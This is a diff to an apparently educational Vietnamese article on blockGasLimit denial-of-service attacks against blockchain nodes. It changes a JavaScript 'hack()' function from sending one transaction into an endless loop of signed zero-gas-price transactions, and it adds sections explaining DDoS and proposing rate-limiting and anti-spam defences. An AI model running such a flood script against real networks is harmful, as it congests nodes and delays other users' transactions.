@@ -179,20 +179,23 @@ async function hack() {
     web3.eth.accounts.wallet.add(privateKey)
     const tx = contract.methods.transfer(1000000)
     const data = tx.encodeABI();
-    const nonce = await web3.eth.getTransactionCount(address);
-    const signedTx = await web3.eth.accounts.signTransaction(
-        {
-            to: contract.options.address, 
-            data,
-            gas: gasLimit,
-            gasPrice: 0,
-            nonce, 
-            chainId: networkId
-        },
-        privateKey
-    );
-    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
-    console.log(receipt)
+    let nonce = await web3.eth.getTransactionCount(address);
+    while(true) {
+        const signedTx = await web3.eth.accounts.signTransaction(
+            {
+                to: contract.options.address, 
+                data,
+                gas: gasLimit,
+                gasPrice: 0,
+                nonce, 
+                chainId: networkId
+            },
+            privateKey
+        );
+
+        nonce++;
+        web3.eth.sendSignedTransaction(signedTx.rawTransaction);
+    }
 }
 hack()
 ```
@@ -201,6 +204,17 @@ Sau khi gọi hàm thì có thể hàm thực thi đã fail trên blockchain net
 
 ## Conclusion
 
-Lỗi `blockGasLimit` sẽ làm giảm hiệu năng và khả năng xử lý của 1 node trong mạng blockchain, mặc dù các miner có thể điều chỉnh `gasLimit` của một block để có thể khác phục lỗi này, nhưng điểu này có thể làm gia tăng phí gas và bùng nổ dữ liệu, nên các miner sẽ rất cân nhắc việc tăng `blockSize`
+DDoS, là từ chối dịch vụ, chiếm hữu tài nguyên, kẻ tấn công sẽ thực hiện các request để chiếm hữu tài nguyên, lỗi này xảy ra sẽ làm cho hệ thống của mình bị nghẽn, không thể phục vụ user bình thường, blockchain cũng có lỗi này, khi lỗi này xảy ra sẽ làm tắc nghẽn khả năng xử lý của một node trong mạng.
 
-Lỗi này cũng gây chậm trễ transaction của các user, điều này thực sự nguy hiểm đối với các smart contract yêu cầu logic về thời gian, vì trong thời gian hacker thực hiện ddos blockchain network, user không thể thực hiện các logic liên quan tới thời gian của mình
+Lỗi `blockGasLimit` sẽ làm giảm hiệu năng và khả năng xử lý của 1 node trong mạng blockchain, mặc dù các miner có thể điều chỉnh `gasLimit` của một block để có thể khác phục lỗi này, nhưng điểu này có thể làm gia tăng phí gas và bùng nổ dữ liệu, nên các miner sẽ rất cân nhắc việc tăng `blockSize`.
+
+Lỗi này cũng gây chậm trễ transaction của các user, điều này thực sự nguy hiểm đối với các smart contract yêu cầu logic về thời gian, vì trong thời gian hacker thực hiện ddos blockchain network, user không thể thực hiện các logic liên quan tới thời gian của mình.
+
+## Solution
+
+Mặc dù với các bản cập nhập của Ethereum, các lỗi này đã cơ bản được khắc phục bẳng cách các miner sẽ tự động tăng `blockSize` lên, nhưng vẫn làm cho các transaction của user bị delay 1 khoảng thời gian trước khi được thực sự xử lý
+
+Sau đây sẽ là 1 số đề xuất khắc phục lỗi này:
+1. Xây dựng middleware để kiểm soát lượng gas trong 1 transaction được gửi tới node
+2. Chỉ cho phép gửi transaction với 1 số lượng nhất định
+3. Xây dựng các mô hình tránh spam khác
